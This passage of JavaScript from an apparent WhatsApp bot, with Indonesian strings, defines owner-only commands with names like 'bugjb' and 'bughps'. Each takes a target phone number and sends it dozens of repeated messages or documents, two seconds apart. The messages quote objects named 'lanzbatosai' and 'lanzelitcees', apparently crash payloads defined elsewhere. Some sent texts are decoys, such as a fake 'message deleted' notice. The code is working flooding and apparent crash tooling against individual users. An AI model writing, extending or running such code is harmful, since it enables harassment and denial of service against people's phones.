 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzelitcees })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzelitcees })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'sg2alok': case 'anjayalok': case 'lanzelitcees': case 'httpsbg': 
  if (!isCreator) return m.reply(`KHUSUS OWNER`)
 if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxxxxx`)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'bugjb': 
  if (!isCreator) return m.reply(`KHUSUS OWNER`)
 if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxxxxx`)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, {text: '𝙿𝚎𝚛𝚖𝚒𝚜𝚒 𝙼𝚊𝚜                                                            𝙼𝚊𝚞 𝙿𝚞𝚜𝚑 𝙺𝚘𝚗𝚝𝚊𝚔 𝚖𝚊𝚜                             𝚂𝚊𝚟𝚎 Lanz                                       𝚂𝚝𝚘𝚛𝚎𝚂𝚅𝚋 ? 𝚂𝚎𝚋𝚞𝚝 𝚗𝚊𝚖𝚊'}, {quoted:lanzelitcees})
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'bughps': 
  if (!isCreator) return m.reply(`KHUSUS OWNER`)
 if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxxxxx`)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, {text: '⦸ _Pesan ini telah dihapus_'}, {quoted:lanzelitcees})
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'bugjb2': 
  if (!isCreator) return m.reply(`KHUSUS OWNER`)
 if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxxxxx`)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, {text: '𝙼𝚊𝚞 𝙱𝚎𝚕𝚒 𝚊𝚔𝚞𝚗 𝚋𝚊𝚗𝚐 ?'}, {quoted:lanzelitcees})
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case '❤️': case '🎮': case '🤤': case '🥹': case '😋': case '😛': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
